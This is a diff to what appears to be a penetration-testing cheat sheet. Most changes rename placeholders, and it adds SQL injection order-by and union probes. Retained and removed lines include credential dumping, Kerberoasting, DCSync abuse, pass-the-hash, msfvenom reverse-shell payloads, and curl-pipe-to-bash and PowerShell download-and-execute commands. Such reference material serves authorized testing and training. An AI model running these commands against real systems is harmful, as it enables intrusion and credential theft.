@@ -645,17 +645,11 @@ hydra -f -t 16 -L {user.txt} -P {pass.txt} rdp://{RHOST}
 
 ```bash
 # Remote Connect
-evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
+evil-winrm -i {RHOST} -u {USER} -p {PASS}
 
 # Upload/Download a File from client => server in current directory
 upload {FILE.exe}
 download {FILE.exe}
-
-# Note: Requires credentials
-# {IP ADDRESS}: IP Address of the Server
-# {USERNAME}:   User Authentication
-# {PASSWORD}:   Password Authentication
-# {FILE.exe}:   File to be uploaded from client machine
 ```
 
 
@@ -762,12 +756,31 @@ admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+MYSQL 
+
+' order by 1/*
+' order by 2/* 
+' order by 3/* 
+' order by 4/* 
+
+' order by 1-- -
+' order by 2-- -
+' order by 3-- -
+' order by 4-- -
+
+' union all select 1,2,3-- -
+
+MSSQL
+
+' order by 1--
+' order by 2--
+' order by 3--
+' order by 4--
+
+' union all select NULL,NULL,NULL--
+
 ```
-
-
-#### ORACLE:
-
-[https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html](https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html)
 
 <br />
 
@@ -790,16 +803,16 @@ net user
 net user /domain
 
 # Enumerate information about user
-net user {USERNAME} /domain
+net user {USER} /domain
 
 # Enumerate all groups in domain
 net group /domain
 
 # Add user
-net user {USERNAME} {PASSWORD} /add /domain
+net user {USER} {PASS} /add /domain
 
 # Add user to group
-net group "{GROUP}" {USERNAME} /add
+net group "{GROUP}" {USER} /add
 
 # MimiKatz Cred Dump Pass the Hash
 sekurlsa::logonpasswords
@@ -810,35 +823,36 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke
 crackmapexec smb {LHOST} -u {user.txt} -H {hash.txt}
 
 # Rubeus Overpass the hash
-rubeus.exe asktgt /domain:{DOMAIN}/user:{USER} /rc4:{NT HASH} /ptt
+rubeus.exe asktgt /domain:{DOMAIN}/user:{USER} /rc4:{HASH} /ptt
 klist
 
 # Kerbrute Brute Force
-sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
-sudo /opt/kerbrute/kerbrute passwordspray -d {DOMAIN} --dc {IP ADDRESS}  {user.txt} {passwords.txt}
-sudo /opt/kerbrute/kerbrute bruteuser -d {DOMAIN} --dc {IP ADDRESS} /usr/share/wordlists/rockyou.txt {USER}
+sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {RHOST} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
+sudo /opt/kerbrute/kerbrute passwordspray -d {DOMAIN} --dc {RHOST}  {user.txt} {passwords.txt}
+sudo /opt/kerbrute/kerbrute bruteuser -d {DOMAIN} --dc {RHOST} /usr/share/wordlists/rockyou.txt {USER}
 
 # Get active directory users
-python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
-python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -hashes {HASH}:{HASH} {DOMAIN}/{USERNAME} -dc-ip {IP ADDRESS}
+python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USER}:{PASS} -dc-ip {RHOST}
+python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -hashes {HASH}:{HASH} {DOMAIN}/{USER} -dc-ip {RHOST}
 
 # Kerberoast - Get user SPN
-python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS} -outputfile hashes.kerberoast
-python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -hashes {HASH}:{HASH} {DOMAIN}/{USERNAME} -dc-ip {DC IP} -outputfile hashes.kerberoast
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USER}:{PASS} -dc-ip {RHOST} -outputfile hashes.kerberoast
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -hashes {HASH}:{HASH} {DOMAIN}/{USER} -dc-ip {RHOST} -outputfile hashes.kerberoast
 
 hashcat -m 13100 {HASH} /usr/share/wordlists/rockyou.txt -O --force
+hashcat -m 13100 {HASH} /usr/share/wordlists/rockyou.txt -O --force --show
 
 # ASREP ROAST
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN}/ -dc-ip {IP ADDRESS} -format john
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN}/ -dc-ip {RHOST} -format john
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN}/ -dc-ip {RHOST} -usersfile {user.txt} -format john
 
 # Request the TGT with hash, AES key, or password
-python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME} -hashes {LM HASH}:{NTLM HASH}
-python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME} -aesKey {AES KEY}
-python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME}:{PASSWORD}
+python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USER} -hashes {HASH}:{HASH}
+python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USER} -aesKey {AES KEY}
+python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USER}:{PASS}
 
 # Kerberos PAC enabled
-python3 /usr/share/doc/python3-impacket/examples/goldenPac.py {DOMAIN}/{USER}@{FULL DOMAIN} -dc-ip {IP ADDRESS} -target-ip {IP ADDRESS}
+python3 /usr/share/doc/python3-impacket/examples/goldenPac.py {DOMAIN}/{USER}@{FULL DOMAIN} -dc-ip {RHOST} -target-ip {RHOST}
 
 # Bloodhound
 sudo neo4j console                          # LHOST
@@ -846,23 +860,22 @@ sudo neo4j console                          # LHOST
 /opt/bloodhound/BloodHound  --no-sandbox    # LHOST
 
 # Bloodhound python remote access
-sudo python3 /opt/BloodHound.py/bloodhound.py -u '{USERNAME}' -p '{PASSWORD}' -ns {IP ADDRESS} -d {DOMAIN} -c all
+sudo python3 /opt/BloodHound.py/bloodhound.py -u '{USER}' -p '{PASS}' -ns {RHOST} -d {DOMAIN} -c all
 
 # Powerview example
 powershell -ExecutionPolicy Bypass
-IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/PowerView.ps1")
-$pass = convertto-securestring '{PASSWORD}' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USERNAME}', $pass)
-Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC={DOMAIN1},DC={DOMAIN2}" -PrincipalIdentity {USERNAME} -Rights DCSync
+IEX(New-Object Net.WebClient).downloadstring("http://{RHOST}/PowerView.ps1")
+$pass = convertto-securestring '{PASS}' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USER}', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC={DOMAIN1},DC={DOMAIN2}" -PrincipalIdentity {USER} -Rights DCSync
 
 # Dump secrets
-sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USERNAME}':'{PASSWORD}'@{IP ADDRESS}
+sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USER}':'{PASS}'@{RHOST}
 
 # PSEXEC
-sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
-sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py {USERNAME}:{PASSWORD}@{IP ADDRESS}
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes {HASH:HASH} {USER}@{RHOST}
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py {USER}:{PASS}@{RHOST}
 ```
-
 
 <br />
 
@@ -883,8 +896,8 @@ sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py {USERNAME}:{PASS
 !mona config -set workingfolder c:\mona\%p
 
 # Update IP Address and Port in fuzzing.py and exploit.py
-ip = {IP ADDRESS TARGET}
-port = {PORT TARGET}
+ip = {RHOST}
+port = {RPORT}
 
 # Fuzz application using a script
 python3 fuzzing.py
@@ -910,13 +923,13 @@ python3 badchar.py
 
 # Exploit and compare against the Mona bytearray until no bad chars are left
 python3 exploit.py
-!mona compare -f C:\mona\appname\bytearray.bin -a <address>
+!mona compare -f C:\mona\appname\bytearray.bin -a {ADDRESS}
 
 # Find the Jump Point
 !mona jmp -r esp -cpb "{BAD CHAR LIST}"
 
 # Generate Payload
-msfvenom -p windows/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} EXITFUNC=thread -b "{BAD CHAR LIST}" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "{BAD CHAR LIST}" -f c
 
 # Update exploit.py with address, payload, and padding
 retn = {Reverse jump address including \x}
@@ -924,7 +937,7 @@ payload = {Payload from msfvenom ("PAYLOAD")}
 padding = "\x90" * 16
 
 # Start NC on msfvenom IP and Port and exploit
-sudo nc -lnvp {PORT}
+sudo nc -lnvp {LPORT}
 python3 exploit.py
 ```
 
@@ -1027,7 +1040,7 @@ python3 exploit.py
 # Check user and groups
 whoami
 whoami /all
-net user {USERNAME}
+net user {USER}
 
 # Check UAC level
 whoami /groups
@@ -1105,7 +1118,7 @@ reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
 # On Kali, we can use the winexe command to spawn a shell using these credentials
-winexe -U '{USER}%{PASSWORD}' //{IP ADDRESS} cmd.exe
+winexe -U '{USER}%{PASS}' //{RHOST} cmd.exe
 
 
 #########################################################################
@@ -1122,7 +1135,7 @@ cmdkey /list
 C:\PrivEsc\savecred.bat
 
 # We can use the saved credential to run any command as the admin user
-runas /savecred /user:admin C:\PrivEsc\reverse.exe
+runas /savecred /user:{admin} {C:\PrivEsc\reverse.exe}
 
 #########################################################################
 #### 3. Credentials from configuration files ############################
@@ -1145,7 +1158,7 @@ findstr /si password *.xml *.ini *.txt
 .\winPEASany.exe quiet cmd searchfast filesinfo
 
 # Copy the files back to Kali
-copy C:\Windows\Repair\SAM \\{IP ADDRESS}\tools\
+copy C:\Windows\Repair\SAM \\{LHOST}\share\
 
 # Download the latest version of the creddump suite
 git clone https://github.com/Neohapsis/creddump7.git
@@ -1174,7 +1187,7 @@ pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc
 systeminfo
 
 # Pipe system information over to client
-systeminfo > \\{Client IP ADDRESS}\systeminfo.txt
+systeminfo > \\{LHOST}\share\systeminfo.txt
 
 # Use Windows exploit suggestor to find availble kernel exploit
 python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
@@ -1196,7 +1209,7 @@ python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 .\winPEASany.exe quiet servicesinfo
 
 # Verify permissions of a service using accesschk
-.\accesschk.exe /accepteula -uwcqv user {SERVICE}
+.\accesschk.exe /accepteula -uwcqv {USER} {SERVICE}
 
 # Query the configuration of a service:
 sc.exe qc {SERVICE}
@@ -1218,7 +1231,7 @@ net start {SERVICE}
 .\winPEASany.exe quiet servicesinfo
 
 # Verify permissions of to start service using accesschk
-.\accesschk.exe /accepteula -uwcqv user {SERVICE}
+.\accesschk.exe /accepteula -uwcqv {USER} {SERVICE}
 
 # Verify permissions of to write using accesschk
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\UnquotedPath Service\"
@@ -1385,30 +1398,6 @@ echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 <br />
 
 
-```bash
-# Windows Enumeration Commands
-
-# Eumerate privileges
-whoami /all
-
-
-
-
-# PS
-Get-WmiObject -Class Win32_UserAccount
-Get-LocalUser | ft Name,Enabled,LastLogon
-Get-ChildItem C:\Users -Force | select Name
-Get-LocalGroupMember Administrators | ft Name, PrincipalSource
-
-# List All Users in a Domain
-Import-Module ActiveDirectory; Get-ADUser -Identity <username> - properties *
-
-# List All Users in a Group
-Import-Module ActiveDirectory; Get-ADPrincipalGroupMembership <username> | select Administrator
-
-```
-<br />
-
 ## Linux 
 
 <br />
@@ -1504,7 +1493,7 @@ pass pass123
 ```bash
 
 # Local
-sudo ssh -N -L 80:127.0.0.1:80 {USER}@{IP ADDRESS} -p {PORT}
+sudo ssh -N -L 80:127.0.0.1:80 {USER}@{RHOST} -p {RPORT}
 
 # Remote
 ssh -N -R {LHOST}:{LPORT}:127.0.0.1:{RPORT} kali@{LHOST}
@@ -1541,14 +1530,14 @@ sudo NMAP -sT -Pn -n {FIREWALLED RHOST}
 
 <br />
 
-```bash
+[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
+```bash
 # Search for correct hashcat number
 hashcat --example-hashes | grep -B5 {HASH IDENTIFIER}
 
 # Crack Hash
 hashcat -m {HASH NUMBER} {HASH} /usr/share/wordlists/rockyou.txt -O --force
-
 ```
 
 <br />
@@ -1625,31 +1614,6 @@ dummy, crypt
 
 <br />
 
-#### FFUF
-
-<br />
-
-```bash
-# FFUF
-# About: A tool used to brute force web credentials
-# Download: Pre-installed on Kali Linux
-
-# Usage - One variable FUZZ
-ffuf -c -request {FILE.req} -request-proto http -w /usr/share/seclists/Passwords/probable-v2-top1575.txt -fs {SIZE}
-
-# Two Variable FUZZ
-ffuf -c -request {FILE.req} -request-proto http -mode clusterbomb -w {user.txt}:HFUZZ -w /usr/share/seclists/Passwords/probable-v2-top1575.txt:WFUZZ -fs {SIZE}
-
-
-# EXAMPLE {FILE}
-username=admin$password=FUZZ
-username=WFUZZ$password=HFUZZ
-
-# Medusa
-medusa -f -h {IP ADDRESS} -u {USER} -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/{DIR}
-
-```
-<br />
 
 # Payload File Transfer
 
@@ -1665,7 +1629,7 @@ medusa -f -h {IP ADDRESS} -u {USER} -P /usr/share/wordlists/rockyou.txt -M http 
 # Download: Pre-installed on Kali Linux
 
 # Python Server
-sudo python3 -m http.server {PORT}
+sudo python3 -m http.server {LPORT}
 
 # Apache2 Server: var/www/html
 sudo systemctl start apache2
@@ -1675,8 +1639,6 @@ sudo service pure-ftpd
 
 # SMB SHARE
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./ -smb2support 
-
-# {PORT}: Port to open for file transfer
 ```
 <br />
 
@@ -1690,33 +1652,30 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./ -smb
 # Download: Pre-installed on Kali Linux
 
 # Usage - Download on server machine
-wget {IP ADDRESS}/{FILE} -outfile {FILE}
-curl {IP ADDRESS}/{FILE}
+wget {LHOST}/{FILE} -outfile {FILE}
+curl {LHOST}/{FILE}
 
 # Linux - Download file and execute in bash:
-curl {IP ADDRESS}/{FILE.sh} | bash
+curl {LHOST}/{FILE.sh} | bash
 
 # Windows - Download file using certutil
-certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
+certutil -split -f -urlcache http://{LHOST}/{FILE}
 
 # Windows - Download file using powershell
-IEX(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
-IEX(new-object System.Net.WebClient).UploadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
+IEX(new-object System.Net.WebClient).DownloadFile('http://{LHOST}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
+IEX(new-object System.Net.WebClient).UploadFile('http://{LHOST}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
 
 # Windows - Load a string file and execute in powershell:
-IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/{FILE}")
+IEX(New-Object Net.WebClient).downloadstring("http://{LHOST}/{FILE.ps1}")
 Invoke-AllChecks
 
 # SMB SHARE UPLOAD FILE
 REG ADD HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
-copy \\{IP ADDRESS}\share\{FILE}
+copy \\{LHOST}\share\{FILE}
 
-# SMB SHARE DOWNLAOD FILE
-net use z: \\{IP ADDRESS}\share
+# SMB SHARE DOWNLOAD FILE
+net use z: \\{LHOST}\share
 copy {FILE} z:
-
-# {IP ADDRESS}: IP Address of the client from step one
-# {FILE}:       The payload to be transferred
 ```
 <br />
 
@@ -1738,7 +1697,7 @@ copy {FILE} z:
 # Download: Pre-installed on Kali Linux
 
 # Usage
-sudo nc -lnvp {PORT}
+sudo nc -lnvp {RPORT}
 
 # {PORT}: Select the port used to listen
 ```
@@ -1765,7 +1724,7 @@ msfvenom -p cmd/windows/reverse_powershell LHOST={LHOST} LPORT=4444 > run.bat
 
 # Linux
 msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x86.elf
-msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x66.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x64.elf
 
 # Web
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f asp > shell.asp
@@ -1839,34 +1798,9 @@ Framework Transform Formats [--format <value>]
     sh
     vbapplication
     vbscript
-
-
-# {IP ADDRESS}: IP Address of the client from step one (listener)
-# {PORT}: Port of the client from step one (listener)
 ```
 <br />
  
-#### Impacket Remote Code Execution
-
-```bash
-# atexec.py : Atexec.py: Impacket has a python library that helps an attacker to access the victim host machine remotely through DCE/RPC based protocol used by CIFS hosts to access/control the AT-Scheduler Service and execute the arbitrary system command.
-
-# PsExec.py : PSEXEC like functionality example using RemComSvc, with the help of python script we can use this module for connecting host machine 
-
-# netview.py : It is an enumeration tool. It requires the domain name to enumerate hosts. It can also be provided with a list of hosts or targets
-
-# Smbexec.py : Smbexec.py uses a similar approach to psexec w/o using RemComSvc
-
-# wmiexec.py : A similar approach to smbexec but executing commands through WMI. The main advantage here is it runs under the user (has to be Admin) account, not SYSTEM, plus, it doesn’t generate noisy messages in the event log that smbexec.py does when creating a service.
-
-# Usage
-/usr/share/doc/python3-impacket/examples/{IMPACKET.py} {USERNAME}:{PASSWORD}@{IP ADDRESS}
-
-# {USERNAME}: Valid Windows username
-# {PASSWORD}: Valid Windows password
-# {IP ADDRESS}: Server IP address
-```
-
 # Shell Upgrade
 
 <br />
